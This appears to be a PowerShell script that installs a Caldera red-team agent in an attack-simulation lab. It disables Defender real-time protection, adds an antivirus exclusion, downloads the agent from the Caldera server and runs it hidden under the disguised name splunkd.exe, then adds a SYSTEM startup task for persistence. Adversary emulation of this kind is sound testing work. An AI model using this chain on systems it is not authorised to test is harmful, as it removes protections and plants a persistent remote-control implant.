$caldera_port = 8888  # Replace with the actual port number
$bas_server = "192.168.0.130"  # Replace with the actual server address

# Set logfile and function for writing logfile
$logfile = "C:\Tools\caldera_log.log"
Function lwrite {
    Param ([string]$logstring)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logstring = "$timestamp $logstring"
    Add-Content $logfile -value $logstring
}

$stagingdir = "C:\Tools"

if (-not (Test-Path -Path $stagingdir)) {
    New-Item -ItemType Directory -Path $stagingdir
    Write-Host "Directory created: $stagingdir"
} else {
    Write-Host "Directory already exists: $stagingdir"
}

lwrite("Starting caldera.ps1")

# Turn off Defender realtime protection so tools can download properly
Set-MpPreference -DisableRealtimeMonitoring $true
# Set AV exclusion path so red team tools can run 
Set-MpPreference -ExclusionPath "C:\Tools" 

# Caldera sandcat agent install
lwrite("Install caldera sandcat agent")
# Loop to check if caldera port is open
$port = "${caldera_port}" 
$server = "${bas_server}"
$timeout = 1000

function Test-Port {
    param ($server, $port, $timeout)
    $tcpClient = New-Object System.Net.Sockets.TcpClient
    $connect = $tcpClient.BeginConnect($server, $port, $null, $null)
    $success = $connect.AsyncWaitHandle.WaitOne($timeout, $false)

    if ($success) {
        $tcpClient.EndConnect($connect)
        return $true
    } else {
        $tcpClient.Close()
        return $false
    }
}

lwrite("Tested port on server good $port")
lwrite("Tested server $server")

do {
    $result = Test-Port -server $server -port $port -timeout $timeout

    if (-not $result) {
        lwrite("Port $port on $server is not open. Retrying...")
        Start-Sleep -Seconds 30
    }

} while (-not $result)

# Run the Caldera sandcat agent
$server="http://${bas_server}:${caldera_port}";
$url="$server/file/download";
$wc=New-Object System.Net.WebClient;
$wc.Headers.add("platform","windows");
$wc.Headers.add("file","sandcat.go");
$data=$wc.DownloadData($url);
get-process | ? {$_.modules.filename -like "C:\Users\Public\splunkd.exe"} | stop-process -f;
rm -force "C:\Users\Public\splunkd.exe" -ea ignore;
[io.file]::WriteAllBytes("C:\Users\Public\splunkd.exe",$data) | Out-Null;
Start-Process -FilePath C:\Users\Public\splunkd.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;

# Additional code to create a scheduled task for persistence
$action = New-ScheduledTaskAction -Execute "C:\Users\Public\splunkd.exe" -Argument "-server $server -group red"
$trigger = New-ScheduledTaskTrigger -AtStartup
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
Register-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $settings -TaskName "CalderaAgent2"

lwrite("End of caldera.ps1")